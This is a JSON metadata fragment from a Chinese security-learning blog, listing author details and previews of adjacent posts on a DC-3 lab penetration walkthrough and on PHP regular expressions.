class=\"toc-text\">利用git提权</span></a></li></ol></li></ol></li></ol>","author":{"name":"Abyssaler","slug":"blog-author","avatar":"https://pic.kts.g.mi.com/551ced5839599747048c3c99a9d47df4203311636470612235.jpg","link":"/","description":"道阻且长，行则将至","socials":{"github":"https://github.com/Abyssaler","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"https://blog.csdn.net/weixin_45349299","juejin":"","customs":{}}},"mapped":true,"prev_post":{"title":"DC-3靶机渗透","uid":"c17a69eda9da12f79f4648a25efd8897","slug":"DC-3靶机渗透","date":"2023-01-10T13:21:22.664Z","updated":"2023-01-08T08:27:46.585Z","comments":true,"path":"api/articles/DC-3靶机渗透.json","keywords":null,"cover":"https://abyssaler-typora-photobank.oss-cn-chengdu.aliyuncs.com/img_for_typorawallhaven-dpj35g.jpg","text":"DC-3靶机渗透全流程一:实验环境攻击机:kali2022(192.168.2.103) 靶机:dc-3(192.168.2.102) 二:信息收集主机发现netdiscover -i eth0 -r 192.168.2.0/24 发现目标主机 端口扫描masscan --rat...","link":"","photos":[],"count_time":{"symbolsCount":"3.9k","symbolsTime":"4 mins."},"categories":[{"name":"渗透从入门到入土","slug":"渗透从入门到入土","count":7,"path":"api/categories/渗透从入门到入土.json"}],"tags":[{"name":"DC系列靶机","slug":"DC系列靶机","count":7,"path":"api/tags/DC系列靶机.json"}],"author":{"name":"Abyssaler","slug":"blog-author","avatar":"https://pic.kts.g.mi.com/551ced5839599747048c3c99a9d47df4203311636470612235.jpg","link":"/","description":"道阻且长，行则将至","socials":{"github":"https://github.com/Abyssaler","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"https://blog.csdn.net/weixin_45349299","juejin":"","customs":{}}}},"next_post":{"title":"PHP正则表达式","uid":"bd6f30a22217917d2172ab3a5accd3dc","slug":"06PHP正则表达式","date":"2023-01-10T13:21:22.644Z","updated":"2022-11-14T02:59:23.086Z","comments":true,"path":"api/articles/06PHP正则表达式.json","keywords":null,"cover":"https://abyssaler-typora-photobank.oss-cn-chengdu.aliyuncs.com/img_for_typorawallhaven-zygeko_1600x900.png","text":"正则表达式正则表达式存在的意义：过滤和检索。 正则表达式，又称规则表达式（Regular Expression ）常简写为regex，regexp，RE; 作用正则表达式通常被用来检索、替换符合规则的文本 特点 灵活性、逻辑性和功能性强 可以快速地用极简单的方式达到支付出的复杂控...","link":"","photos":[],"count_time":{"symbolsCount":"1.3k","symbolsTime":"1 mins."},"categories":[{"name":"学习笔记","slug":"学习笔记","count":13,"path":"api/categories/学习笔记.json"}],"tags":[{"name":"php","slug":"php","count":8,"path":"api/tags/php.json"}],"author":{"name":"Abyssaler","slug":"blog-author","avatar":"https://pic.kts.g.mi.com/551ced5839599747048c3c99a9d47df4203311636470612235.jpg","link":"/","description":"道阻且长，行则将至","socials":{"github":"https://github.com/Abyssaler","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"https://blog.csdn.net/weixin_45349299","juejin":"","customs":{}}}}}